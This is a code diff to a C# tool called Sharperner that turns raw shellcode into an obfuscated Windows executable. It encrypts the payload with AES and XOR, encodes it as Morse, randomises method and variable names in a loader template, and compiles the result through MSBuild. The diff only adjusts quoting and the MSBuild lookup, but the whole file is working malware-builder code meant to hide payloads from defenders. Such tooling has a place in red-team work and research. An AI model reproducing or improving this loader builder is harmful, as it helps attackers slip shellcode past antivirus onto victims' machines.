@@ -358,11 +358,12 @@ Sharperner.exe /file:file.txt /out:payload.exe
                         // back in the history
                         MorseForFun.InitializeDictionary();
 
+//changes on the quotation
                         rawB64Output = Convert.ToBase64String(xorAesEncByte);
-                        xorAesEncStringB64 = MorseForFun.Send(rawB64Output);
-                        morsed_aeskey = MorseForFun.Send(aes_key);
-                        morsed_aesiv = MorseForFun.Send(aes_iv);
-                        xorKey = MorseForFun.Send(xorKey);
+                        xorAesEncStringB64 = $"\"{MorseForFun.Send(rawB64Output)}\"";
+                        morsed_aeskey = $"\"{MorseForFun.Send(aes_key)}\"";
+                        morsed_aesiv = $"\"{MorseForFun.Send(aes_iv)}\"";
+                        xorKey = $"\"{MorseForFun.Send(xorKey)}\"";
 
                         Console.WriteLine("[+] Payload is now AES and XOR encrypted!");
                     }
@@ -446,7 +447,6 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                     try
                     {
-
                         // randomize method names
                         var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
                         var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
@@ -473,9 +473,9 @@ Sharperner.exe /file:file.txt /out:payload.exe
                             templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
                         }
 
-
                         // replace in template file
-                        templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
+                        templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+
                     }
                     catch (Exception err)
                     {
@@ -583,8 +583,7 @@ Sharperner.exe /file:file.txt /out:payload.exe
                             templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
                         }
 
-                        templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
-
+                        templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
                     }
                     catch
                     {
@@ -605,82 +604,81 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                     //compile with this
                     //"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe" C: \Users\REUSER\source\repos\ObfuscatorXOR\Sharperner\Sharperner.sln / t:loader
-                    try
+
+                    var processInfo = new ProcessStartInfo("cmd.exe", "/c \"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath")
                     {
-                        var msBuildPath = "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community";
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        RedirectStandardError = true,
+                        RedirectStandardOutput = true,
+                        WorkingDirectory = @"C:\Windows\System32\"
+                    };
 
+                    StringBuilder sb = new StringBuilder();
+                    Process p = Process.Start(processInfo);
+                    p.OutputDataReceived += (sender, a) => sb.AppendLine(a.Data);
+                    p.BeginOutputReadLine();
+                    p.WaitForExit();
+                    var msBuildPath = sb.ToString().Trim();
+
+                    if (string.IsNullOrEmpty(msBuildPath.ToString()))
+                    {
+                        Console.WriteLine("[!] Couldn't find MSBuild.exe location. Exiting...");
+                    }
+                    else
+                    {
                         try
                         {
-                            var processInfo = new ProcessStartInfo("cmd.exe", "/c \"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath")
+
+                            try
                             {
-                                CreateNoWindow = true,
-                                UseShellExecute = false,
-                                RedirectStandardError = true,
-                                RedirectStandardOutput = true,
-                                WorkingDirectory = @"C:\Windows\System32\"
-                            };
+                                string strCmd = $"/c \"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\" {slnFile} /t:loader";
 
-                            StringBuilder sb = new StringBuilder();
-                            Process p = Process.Start(processInfo);
-                            p.OutputDataReceived += (sender, a) => sb.AppendLine(a.Data);
-                            p.BeginOutputReadLine();
-                            p.WaitForExit();
-                            msBuildPath = sb.ToString().Trim();
-                        }
-                        catch
-                        {
-                            Console.WriteLine("[!] Couldn't find MSBuild.exe location");
-                            Environment.Exit(0);
-                        }
+                                using (Process compiler = new Process())
+                                {
+                                    compiler.StartInfo.FileName = @"CMD.exe";
+                                    compiler.StartInfo.Arguments = strCmd;
+                                    compiler.StartInfo.UseShellExecute = false;
+                                    compiler.StartInfo.CreateNoWindow = true;
+                                    compiler.StartInfo.RedirectStandardError = true;
+                                    compiler.Start();
+                                }
 
-                        try
-                        {
-                            string strCmd = $"/c \"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\" {slnFile} /t:loader";
-
-                            using (Process compiler = new Process())
-                            {
-                                compiler.StartInfo.FileName = @"CMD.exe";
-                                compiler.StartInfo.Arguments = strCmd;
-                                compiler.StartInfo.UseShellExecute = false;
-                                compiler.StartInfo.CreateNoWindow = true;
-                                compiler.StartInfo.RedirectStandardError = true;
-                                compiler.Start();
                             }
+                            catch
+                            {
+                                Console.WriteLine("[!] Error compiling. Exiting...");
+                                Environment.Exit(0);
+                            }
+                        }
+                        catch (Exception err)
+                        {
+                            Console.WriteLine($"[!] {err.Message}");
+                            Environment.Exit(0);
+                        }
 
+                        Console.WriteLine($"[+] Doing some cleaning...");
+
+                        //wait for it to compile
+                        Thread.Sleep(5000);
+
+                        try
+                        {
+                            File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+
+                            File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");
+
+                            Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                         }
                         catch
                         {
-                            Console.WriteLine("[!] Error while compiling. Exiting...");
-                            Environment.Exit(0);
+                            Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
                         }
+
+                        //revert the file
+                        File.WriteAllText(rootFile, temp);
                     }
-                    catch (Exception err)
-                    {
-                        Console.WriteLine($"[!] {err.Message}");
-                        Environment.Exit(0);
-                    }
-
-                    Console.WriteLine($"[+] Doing some cleaning...");
-
-                    //wait for it to compile
-                    Thread.Sleep(5000);
-
-                    try
-                    {
-                        File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
-
-                        File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");
-
-                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
-                    }
-                    catch
-                    {
-                        Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
-                    }
-
-                    //revert the file
-                    File.WriteAllText(rootFile, temp);
-
+                    
                 }
 
             }
